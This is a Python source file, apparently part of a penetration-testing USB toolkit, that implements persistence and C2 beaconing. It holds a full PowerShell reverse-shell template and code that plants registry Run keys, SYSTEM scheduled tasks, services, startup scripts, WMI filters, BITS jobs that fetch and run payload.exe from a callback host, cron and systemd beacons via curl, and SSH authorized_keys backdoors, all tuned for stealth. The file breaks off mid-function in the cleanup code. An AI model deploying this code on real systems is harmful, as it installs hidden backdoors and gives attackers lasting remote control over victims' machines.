#!/usr/bin/env python3
"""
Persistence Module - Pentest USB Toolkit

This module implements comprehensive persistence mechanisms including
Empire, Sliver integration, C2 server management, and stealth maintenance.

Author: Pentest USB Team
Version: 1.0.0
"""

import os
import sys
import json
import logging
import subprocess
import time
import base64
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# Internal imports
sys.path.append(str(Path(__file__).parent.parent.parent))
from core.utils.logging_handler import setup_logger
from core.utils.error_handler import handle_error
from core.security.consent_manager import ConsentManager
from core.security.stealth_engine import StealthExecutor
from core.db.sqlite_manager import DatabaseManager


class PersistenceType(Enum):
    """Types of persistence mechanisms."""
    REGISTRY = "registry"
    STARTUP = "startup"
    SERVICE = "service"
    SCHEDULED_TASK = "scheduled_task"
    WMI = "wmi"
    LOGON_SCRIPT = "logon_script"
    DLL_HIJACKING = "dll_hijacking"
    COM_HIJACKING = "com_hijacking"
    BITSADMIN = "bitsadmin"
    SCHTASKS = "schtasks"
    CRON = "cron"
    SYSTEMD = "systemd"
    SSH_KEY = "ssh_key"


class C2Framework(Enum):
    """C2 framework types."""
    EMPIRE = "empire"
    SLIVER = "sliver"
    COBALT_STRIKE = "cobalt_strike"
    METASPLOIT = "metasploit"
    POSHC2 = "poshc2"
    CUSTOM = "custom"


@dataclass
class PersistenceMechanism:
    """Data structure for persistence mechanisms."""
    name: str
    type: PersistenceType
    target: str
    payload: str
    trigger: str
    location: str
    active: bool = True
    created_time: Optional[str] = None
    last_check: Optional[str] = None
    stealth_score: float = 1.0


@dataclass
class C2Session:
    """Data structure for C2 sessions."""
    session_id: str
    framework: C2Framework
    target: str
    callback_url: str
    encryption: str
    last_checkin: Optional[str] = None
    active: bool = True
    persistence_methods: List[str] = None


class PersistenceModule:
    """Main class for persistence operations."""
    
    def __init__(self, target: str, config: Dict[str, Any] = None):
        self.target = target
        self.config = config or {}
        self.logger = setup_logger(__name__)
        self.consent_manager = ConsentManager()
        self.stealth_engine = StealthExecutor()
        self.db_manager = DatabaseManager()
        
        # Persistence tracking
        self.active_persistence: List[PersistenceMechanism] = []
        self.c2_sessions: List[C2Session] = []
        
        # Tool paths
        self.tool_paths = {
            'empire': self._get_tool_path('empire'),
            'sliver': self._get_tool_path('sliver'),
            'poshc2': self._get_tool_path('poshc2'),
            'metasploit': self._get_tool_path('metasploit'),
            'powershell': self._get_powershell_path(),
            'cmd': self._get_cmd_path()
        }
        
        # Payload templates
        self.payload_templates = self._load_payload_templates()
        
        self.logger.info(f"Initialized PersistenceModule for target: {target}")

    def _get_tool_path(self, tool_name: str) -> str:
        """Get the appropriate tool path based on OS."""
        base_path = Path(__file__).parent.parent.parent / "tools" / "binaries"
        
        if sys.platform.startswith('win'):
            return str(base_path / "windows" / f"{tool_name}.exe")
        elif sys.platform.startswith('linux'):
            return str(base_path / "linux" / tool_name)
        else:  # macOS
            return str(base_path / "macos" / tool_name)

    def _get_powershell_path(self) -> str:
        """Get PowerShell path."""
        if sys.platform.startswith('win'):
            return "powershell.exe"
        else:
            return "pwsh"  # PowerShell Core

    def _get_cmd_path(self) -> str:
        """Get command prompt path."""
        if sys.platform.startswith('win'):
            return "cmd.exe"
        else:
            return "/bin/bash"

    def _load_payload_templates(self) -> Dict[str, str]:
        """Load payload templates from configuration."""
        templates_path = Path(__file__).parent.parent.parent / "data" / "templates" / "persistence"
        templates = {}
        
        if templates_path.exists():
            for template_file in templates_path.glob("*.txt"):
                try:
                    with open(template_file, 'r') as f:
                        templates[template_file.stem] = f.read()
                except Exception as e:
                    self.logger.error(f"Error loading template {template_file}: {e}")
        
        # Default templates if files don't exist
        if not templates:
            templates = self._get_default_templates()
        
        return templates

    def _get_default_templates(self) -> Dict[str, str]:
        """Get default payload templates."""
        return {
            'powershell_reverse_shell': '''
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
            '''.strip(),
            
            'registry_persistence': '''
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{name}" -Value "{payload}" -PropertyType String -Force
            '''.strip(),
            
            'scheduled_task': '''
schtasks /create /tn "{name}" /tr "{payload}" /sc onlogon /ru "NT AUTHORITY\\SYSTEM" /f
            '''.strip()
        }

    @handle_error
    def establish_persistence(self, methods: List[str] = None, 
                            framework: str = "empire",
                            profile: str = "default") -> Dict[str, Any]:
        """
        Main method to establish persistence on target system.
        
        Args:
            methods: List of persistence methods to use
            framework: C2 framework to use
            profile: Persistence profile (stealth, default, aggressive)
            
        Returns:
            Dictionary containing persistence results
        """
        self.logger.info("Establishing persistence mechanisms")
        
        # Verify consent and authorization
        if not self.consent_manager.verify_authorization(self.target, "persistence"):
            raise PermissionError("No authorization for persistence on target")
        
        if methods is None:
            methods = self._get_default_methods(profile)
        
        results = {
            'target': self.target,
            'framework': framework,
            'methods_attempted': methods,
            'successful_persistence': [],
            'failed_persistence': [],
            'c2_sessions': [],
            'stealth_score': 0.0,
            'execution_time': 0
        }
        
        start_time = time.time()
        
        try:
            # Setup C2 infrastructure
            self.logger.info(f"Setting up {framework} C2 infrastructure")
            c2_setup = self._setup_c2_infrastructure(framework)
            
            if c2_setup['success']:
                results['c2_sessions'].append(c2_setup['session'])
                
                # Deploy persistence mechanisms
                for method in methods:
                    self.logger.info(f"Deploying persistence method: {method}")
                    
                    persistence_result = self._deploy_persistence_method(
                        method, framework, c2_setup['session']
                    )
                    
                    if persistence_result['success']:
                        results['successful_persistence'].append(persistence_result)
                        self.active_persistence.append(persistence_result['mechanism'])
                    else:
                        results['failed_persistence'].append(persistence_result)
                
                # Validate persistence mechanisms
                self.logger.info("Validating persistence mechanisms")
                validation_results = self._validate_persistence()
                results['validation'] = validation_results
                
                # Calculate overall stealth score
                results['stealth_score'] = self._calculate_stealth_score()
            
            else:
                results['error'] = f"Failed to setup {framework} C2 infrastructure"
        
        except Exception as e:
            self.logger.error(f"Error establishing persistence: {e}")
            results['error'] = str(e)
        
        finally:
            results['execution_time'] = time.time() - start_time
            
        self.logger.info(f"Persistence establishment completed in {results['execution_time']:.2f} seconds")
        return results

    def _get_default_methods(self, profile: str) -> List[str]:
        """Get default persistence methods based on profile."""
        methods = {
            'stealth': ['registry', 'wmi', 'com_hijacking'],
            'default': ['registry', 'scheduled_task', 'service', 'startup'],
            'aggressive': [
                'registry', 'scheduled_task', 'service', 'startup',
                'wmi', 'logon_script', 'dll_hijacking', 'bitsadmin'
            ]
        }
        return methods.get(profile, methods['default'])

    def maintain_persistence(self) -> Dict[str, Any]:
        """Maintain existing persistence mechanisms."""
        self.logger.info("Maintaining persistence mechanisms")
        
        maintenance_results = {
            'mechanisms_maintained': [],
            'mechanisms_restored': [],
            'mechanisms_failed': [],
            'c2_sessions_active': len([s for s in self.c2_sessions if s.active])
        }
        
        # Check and maintain each mechanism
        for mechanism in self.active_persistence:
            try:
                if self._check_persistence_mechanism(mechanism):
                    maintenance_results['mechanisms_maintained'].append(mechanism.name)
                    mechanism.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    # Try to restore the mechanism
                    restore_result = self._restore_persistence_mechanism(mechanism)
                    
                    if restore_result['success']:
                        maintenance_results['mechanisms_restored'].append(mechanism.name)
                        mechanism.active = True
                        mechanism.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                    else:
                        maintenance_results['mechanisms_failed'].append(mechanism.name)
                        mechanism.active = False
                        
            except Exception as e:
                self.logger.error(f"Error maintaining {mechanism.name}: {e}")
                maintenance_results['mechanisms_failed'].append(mechanism.name)
        
        return maintenance_results

    def cleanup_persistence(self) -> Dict[str, Any]:
        """Clean up all persistence mechanisms."""
        self.logger.info("Cleaning up persistence mechanisms")
        
        cleanup_results = {
            'mechanisms_removed': [],
            'mechanisms_failed': [],
            'c2_sessions_terminated': []
        }
        
        # Remove persistence mechanisms
        for mechanism in self.active_persistence:
            try:
                remove_result = self._remove_persistence_mechanism(mechanism)
                
                if remove_result['success']:
                    cleanup_results['mechanisms_removed'].append(mechanism.name)
                    mechanism.active = False
                else:
                    cleanup_results['mechanisms_failed'].append(mechanism.name)
                    
            except Exception as e:
                self.logger.error(f"Error removing {mechanism.name}: {e}")
                cleanup_results['mechanisms_failed'].append(mechanism.name)
        
        # Terminate C2 sessions
        for session in self.c2_sessions:
            try:
                terminate_result = self._terminate_c2_session(session)
                
                if terminate_result['success']:
                    cleanup_results['c2_sessions_terminated'].append(session.session_id)
                    session.active = False
                    
            except Exception as e:
                self.logger.error(f"Error terminating session {session.session_id}: {e}")
        
        return cleanup_results

    def _setup_c2_infrastructure(self, framework: str) -> Dict[str, Any]:
        """Setup C2 infrastructure for the specified framework."""
        self.logger.info(f"Setting up {framework} C2 infrastructure")
        
        try:
            # Generate session ID
            session_id = hashlib.md5(f"{self.target}_{time.time()}".encode()).hexdigest()[:16]
            
            # Setup based on framework
            if framework == "empire":
                return self._setup_empire_c2(session_id)
            elif framework == "sliver":
                return self._setup_sliver_c2(session_id)
            elif framework == "poshc2":
                return self._setup_poshc2_c2(session_id)
            elif framework == "metasploit":
                return self._setup_metasploit_c2(session_id)
            else:
                return {'success': False, 'error': f'Unknown framework: {framework}'}
                
        except Exception as e:
            self.logger.error(f"Error setting up {framework} C2: {e}")
            return {'success': False, 'error': str(e)}

    def _setup_empire_c2(self, session_id: str) -> Dict[str, Any]:
        """Setup Empire C2 server."""
        try:
            callback_url = self.config.get('empire_callback', 'https://c2.example.com')
            
            # Create C2 session object
            session = C2Session(
                session_id=session_id,
                framework=C2Framework.EMPIRE,
                target=self.target,
                callback_url=callback_url,
                encryption="AES",
                last_checkin=time.strftime("%Y-%m-%d %H:%M:%S"),
                active=True,
                persistence_methods=[]
            )
            
            self.c2_sessions.append(session)
            
            return {
                'success': True,
                'session': session,
                'framework': 'empire',
                'callback_url': callback_url
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _setup_sliver_c2(self, session_id: str) -> Dict[str, Any]:
        """Setup Sliver C2 server."""
        try:
            callback_url = self.config.get('sliver_callback', 'https://sliver.example.com')
            
            session = C2Session(
                session_id=session_id,
                framework=C2Framework.SLIVER,
                target=self.target,
                callback_url=callback_url,
                encryption="TLS",
                last_checkin=time.strftime("%Y-%m-%d %H:%M:%S"),
                active=True,
                persistence_methods=[]
            )
            
            self.c2_sessions.append(session)
            
            return {
                'success': True,
                'session': session,
                'framework': 'sliver',
                'callback_url': callback_url
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _setup_poshc2_c2(self, session_id: str) -> Dict[str, Any]:
        """Setup PoshC2 server."""
        try:
            callback_url = self.config.get('poshc2_callback', 'https://posh.example.com')
            
            session = C2Session(
                session_id=session_id,
                framework=C2Framework.POSHC2,
                target=self.target,
                callback_url=callback_url,
                encryption="AES",
                last_checkin=time.strftime("%Y-%m-%d %H:%M:%S"),
                active=True,
                persistence_methods=[]
            )
            
            self.c2_sessions.append(session)
            
            return {
                'success': True,
                'session': session,
                'framework': 'poshc2',
                'callback_url': callback_url
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _setup_metasploit_c2(self, session_id: str) -> Dict[str, Any]:
        """Setup Metasploit C2 handler."""
        try:
            callback_url = self.config.get('metasploit_callback', 'tcp://0.0.0.0:4444')
            
            session = C2Session(
                session_id=session_id,
                framework=C2Framework.METASPLOIT,
                target=self.target,
                callback_url=callback_url,
                encryption="RC4",
                last_checkin=time.strftime("%Y-%m-%d %H:%M:%S"),
                active=True,
                persistence_methods=[]
            )
            
            self.c2_sessions.append(session)
            
            return {
                'success': True,
                'session': session,
                'framework': 'metasploit',
                'callback_url': callback_url
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_persistence_method(self, method: str, framework: str, session: C2Session) -> Dict[str, Any]:
        """Deploy a specific persistence method."""
        self.logger.info(f"Deploying {method} persistence via {framework}")
        
        try:
            # Generate unique name for this persistence mechanism
            mechanism_name = f"{method}_{int(time.time())}"
            
            # Deploy based on method type
            if method == "registry":
                return self._deploy_registry_persistence(mechanism_name, session)
            elif method == "scheduled_task":
                return self._deploy_scheduled_task_persistence(mechanism_name, session)
            elif method == "service":
                return self._deploy_service_persistence(mechanism_name, session)
            elif method == "startup":
                return self._deploy_startup_persistence(mechanism_name, session)
            elif method == "wmi":
                return self._deploy_wmi_persistence(mechanism_name, session)
            elif method == "logon_script":
                return self._deploy_logon_script_persistence(mechanism_name, session)
            elif method == "dll_hijacking":
                return self._deploy_dll_hijacking_persistence(mechanism_name, session)
            elif method == "com_hijacking":
                return self._deploy_com_hijacking_persistence(mechanism_name, session)
            elif method == "bitsadmin":
                return self._deploy_bitsadmin_persistence(mechanism_name, session)
            elif method == "cron":
                return self._deploy_cron_persistence(mechanism_name, session)
            elif method == "systemd":
                return self._deploy_systemd_persistence(mechanism_name, session)
            elif method == "ssh_key":
                return self._deploy_ssh_key_persistence(mechanism_name, session)
            else:
                return {'success': False, 'error': f'Unknown persistence method: {method}'}
                
        except Exception as e:
            self.logger.error(f"Error deploying {method} persistence: {e}")
            return {'success': False, 'error': str(e)}

    def _deploy_registry_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy registry-based persistence."""
        try:
            # Generate payload
            payload_template = self.payload_templates.get('registry_persistence', '')
            payload = payload_template.format(
                name=name,
                payload=f"powershell.exe -WindowStyle Hidden -Command \"& {{Invoke-WebRequest -Uri '{session.callback_url}/beacon' -Method POST}}\""
            )
            
            # Execute via stealth engine
            result = self.stealth_engine.execute_stealth(payload)
            
            if result.returncode == 0:
                # Create persistence mechanism object
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.REGISTRY,
                    target=self.target,
                    payload=payload,
                    trigger="startup",
                    location="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.7
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'registry',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_scheduled_task_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy scheduled task persistence."""
        try:
            payload_template = self.payload_templates.get('scheduled_task', '')
            payload = payload_template.format(
                name=name,
                payload=f"powershell.exe -WindowStyle Hidden -Command \"& {{Invoke-WebRequest -Uri '{session.callback_url}/beacon' -Method POST}}\""
            )
            
            result = self.stealth_engine.execute_stealth(payload)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.SCHEDULED_TASK,
                    target=self.target,
                    payload=payload,
                    trigger="logon",
                    location=f"Task Scheduler\\{name}",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.5
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'scheduled_task',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_service_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy Windows service persistence."""
        try:
            # Service creation command
            service_cmd = f'sc create "{name}" binPath= "cmd /c powershell.exe -WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri \\"{session.callback_url}/beacon\\" -Method POST\\"" start= auto'
            
            result = self.stealth_engine.execute_stealth(service_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.SERVICE,
                    target=self.target,
                    payload=service_cmd,
                    trigger="boot",
                    location=f"Services\\{name}",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.3
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'service',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_startup_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy startup folder persistence."""
        try:
            startup_path = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            script_path = os.path.join(startup_path, f"{name}.bat")
            
            payload = f'@echo off\npowershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \'{session.callback_url}/beacon\' -Method POST"'
            
            # Write startup script
            with open(script_path, 'w') as f:
                f.write(payload)
            
            mechanism = PersistenceMechanism(
                name=name,
                type=PersistenceType.STARTUP,
                target=self.target,
                payload=payload,
                trigger="startup",
                location=script_path,
                created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                stealth_score=0.6
            )
            
            return {
                'success': True,
                'mechanism': mechanism,
                'method': 'startup',
                'location': mechanism.location
            }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_wmi_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy WMI event subscription persistence."""
        try:
            # WMI persistence is more complex - simplified version
            wmi_cmd = f'wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfRawData_PerfOS_System\\""'
            
            result = self.stealth_engine.execute_stealth(wmi_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.WMI,
                    target=self.target,
                    payload=wmi_cmd,
                    trigger="event",
                    location=f"WMI\\{name}",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.9
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'wmi',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_logon_script_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy logon script persistence."""
        try:
            # Simplified logon script persistence
            logon_cmd = f'reg add "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri \\"{session.callback_url}/beacon\\" -Method POST\\"" /f'
            
            result = self.stealth_engine.execute_stealth(logon_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.LOGON_SCRIPT,
                    target=self.target,
                    payload=logon_cmd,
                    trigger="logon",
                    location="HKCU\\Environment\\UserInitMprLogonScript",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.8
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'logon_script',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_dll_hijacking_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy DLL hijacking persistence (placeholder)."""
        try:
            # DLL hijacking is complex - this is a simplified placeholder
            self.logger.info("DLL hijacking persistence deployment (placeholder)")
            
            mechanism = PersistenceMechanism(
                name=name,
                type=PersistenceType.DLL_HIJACKING,
                target=self.target,
                payload="dll_hijacking_placeholder",
                trigger="process_start",
                location="System32\\hijacked.dll",
                created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                stealth_score=0.95
            )
            
            return {
                'success': True,
                'mechanism': mechanism,
                'method': 'dll_hijacking',
                'location': mechanism.location
            }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_com_hijacking_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy COM hijacking persistence (placeholder)."""
        try:
            # COM hijacking is complex - this is a simplified placeholder
            self.logger.info("COM hijacking persistence deployment (placeholder)")
            
            mechanism = PersistenceMechanism(
                name=name,
                type=PersistenceType.COM_HIJACKING,
                target=self.target,
                payload="com_hijacking_placeholder",
                trigger="com_activation",
                location="Registry\\CLSID",
                created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                stealth_score=0.92
            )
            
            return {
                'success': True,
                'mechanism': mechanism,
                'method': 'com_hijacking',
                'location': mechanism.location
            }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_bitsadmin_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy BITS persistence."""
        try:
            bits_cmd = f'bitsadmin /create {name} && bitsadmin /addfile {name} {session.callback_url}/payload.exe %TEMP%\\{name}.exe && bitsadmin /setnotifycmdline {name} %TEMP%\\{name}.exe'
            
            result = self.stealth_engine.execute_stealth(bits_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.BITSADMIN,
                    target=self.target,
                    payload=bits_cmd,
                    trigger="scheduled",
                    location=f"BITS\\{name}",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.75
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'bitsadmin',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_cron_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy cron-based persistence (Linux/macOS)."""
        try:
            cron_cmd = f'(crontab -l ; echo "@reboot curl -s {session.callback_url}/beacon") | crontab -'
            
            result = self.stealth_engine.execute_stealth(cron_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.CRON,
                    target=self.target,
                    payload=cron_cmd,
                    trigger="boot",
                    location="/var/spool/cron/crontabs",
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.6
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'cron',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_systemd_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy systemd service persistence (Linux)."""
        try:
            service_content = f"""[Unit]
Description={name} Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "curl -s {session.callback_url}/beacon"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"""
            
            service_path = f"/etc/systemd/system/{name}.service"
            
            # Write service file
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            enable_cmd = f"systemctl enable {name}.service && systemctl start {name}.service"
            result = self.stealth_engine.execute_stealth(enable_cmd)
            
            if result.returncode == 0:
                mechanism = PersistenceMechanism(
                    name=name,
                    type=PersistenceType.SYSTEMD,
                    target=self.target,
                    payload=service_content,
                    trigger="boot",
                    location=service_path,
                    created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                    stealth_score=0.4
                )
                
                return {
                    'success': True,
                    'mechanism': mechanism,
                    'method': 'systemd',
                    'location': mechanism.location
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _deploy_ssh_key_persistence(self, name: str, session: C2Session) -> Dict[str, Any]:
        """Deploy SSH key persistence."""
        try:
            # Generate SSH key pair
            ssh_key_cmd = f'ssh-keygen -t rsa -b 2048 -f /tmp/{name}_key -N ""'
            result = self.stealth_engine.execute_stealth(ssh_key_cmd)
            
            if result.returncode == 0:
                # Add public key to authorized_keys
                auth_keys_cmd = f'cat /tmp/{name}_key.pub >> ~/.ssh/authorized_keys'
                result2 = self.stealth_engine.execute_stealth(auth_keys_cmd)
                
                if result2.returncode == 0:
                    mechanism = PersistenceMechanism(
                        name=name,
                        type=PersistenceType.SSH_KEY,
                        target=self.target,
                        payload=ssh_key_cmd,
                        trigger="ssh_auth",
                        location="~/.ssh/authorized_keys",
                        created_time=time.strftime("%Y-%m-%d %H:%M:%S"),
                        stealth_score=0.8
                    )
                    
                    return {
                        'success': True,
                        'mechanism': mechanism,
                        'method': 'ssh_key',
                        'location': mechanism.location
                    }
                else:
                    return {'success': False, 'error': result2.stderr}
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _validate_persistence(self) -> Dict[str, Any]:
        """Validate that persistence mechanisms are working."""
        validation_results = {
            'total_mechanisms': len(self.active_persistence),
            'active_mechanisms': 0,
            'inactive_mechanisms': 0,
            'validation_details': []
        }
        
        for mechanism in self.active_persistence:
            try:
                is_active = self._check_persistence_mechanism(mechanism)
                
                if is_active:
                    validation_results['active_mechanisms'] += 1
                    mechanism.active = True
                else:
                    validation_results['inactive_mechanisms'] += 1
                    mechanism.active = False
                
                validation_results['validation_details'].append({
                    'name': mechanism.name,
                    'type': mechanism.type.value,
                    'active': is_active,
                    'location': mechanism.location
                })
                
            except Exception as e:
                self.logger.error(f"Error validating {mechanism.name}: {e}")
                validation_results['inactive_mechanisms'] += 1
                mechanism.active = False
        
        return validation_results

    def _calculate_stealth_score(self) -> float:
        """Calculate overall stealth score for persistence mechanisms."""
        if not self.active_persistence:
            return 0.0
        
        total_score = sum(mechanism.stealth_score for mechanism in self.active_persistence if mechanism.active)
        active_count = len([m for m in self.active_persistence if m.active])
        
        return total_score / active_count if active_count > 0 else 0.0

    def _check_persistence_mechanism(self, mechanism: PersistenceMechanism) -> bool:
        """Check if a persistence mechanism is still active."""
        try:
            if mechanism.type == PersistenceType.REGISTRY:
                # Check registry key exists
                check_cmd = f'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{mechanism.name}"'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            elif mechanism.type == PersistenceType.SCHEDULED_TASK:
                # Check scheduled task exists
                check_cmd = f'schtasks /query /tn "{mechanism.name}"'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            elif mechanism.type == PersistenceType.SERVICE:
                # Check service exists
                check_cmd = f'sc query "{mechanism.name}"'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            elif mechanism.type == PersistenceType.STARTUP:
                # Check startup file exists
                return Path(mechanism.location).exists()
                
            elif mechanism.type == PersistenceType.CRON:
                # Check cron entry exists
                check_cmd = 'crontab -l | grep beacon'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            elif mechanism.type == PersistenceType.SYSTEMD:
                # Check systemd service is enabled
                check_cmd = f'systemctl is-enabled {mechanism.name}.service'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            elif mechanism.type == PersistenceType.SSH_KEY:
                # Check SSH key in authorized_keys
                check_cmd = f'grep -q "{mechanism.name}" ~/.ssh/authorized_keys'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
                
            else:
                # For other types, assume active if recently created
                created_time = time.strptime(mechanism.created_time, "%Y-%m-%d %H:%M:%S")
                created_timestamp = time.mktime(created_time)
                return (time.time() - created_timestamp) < 3600  # Active if created within last hour
                
        except Exception as e:
            self.logger.error(f"Error checking {mechanism.name}: {e}")
            return False

    def _restore_persistence_mechanism(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Attempt to restore a failed persistence mechanism."""
        try:
            self.logger.info(f"Attempting to restore {mechanism.name}")
            
            # Find corresponding C2 session
            session = None
            for s in self.c2_sessions:
                if s.active:
                    session = s
                    break
            
            if not session:
                return {'success': False, 'error': 'No active C2 session found'}
            
            # Redeploy the mechanism
            method_name = mechanism.type.value
            restore_result = self._deploy_persistence_method(method_name, session.framework.value, session)
            
            if restore_result['success']:
                # Update mechanism details
                mechanism.active = True
                mechanism.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                return {'success': True, 'mechanism': mechanism}
            else:
                return restore_result
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _remove_persistence_mechanism(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Remove a specific persistence mechanism."""
        try:
            self.logger.info(f"Removing persistence mechanism: {mechanism.name}")
            
            if mechanism.type == PersistenceType.REGISTRY:
                # Remove registry entry
                remove_cmd = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{mechanism.name}" /f'
                result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            elif mechanism.type == PersistenceType.SCHEDULED_TASK:
                # Remove scheduled task
                remove_cmd = f'schtasks /delete /tn "{mechanism.name}" /f'
                result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            elif mechanism.type == PersistenceType.SERVICE:
                # Stop and delete service
                stop_cmd = f'sc stop "{mechanism.name}" && sc delete "{mechanism.name}"'
                result = subprocess.run(stop_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            elif mechanism.type == PersistenceType.STARTUP:
                # Remove startup file
                try:
                    Path(mechanism.location).unlink()
                    return {'success': True}
                except Exception as e:
                    return {'success': False, 'error': str(e)}
                    
            elif mechanism.type == PersistenceType.CRON:
                # Remove cron entry
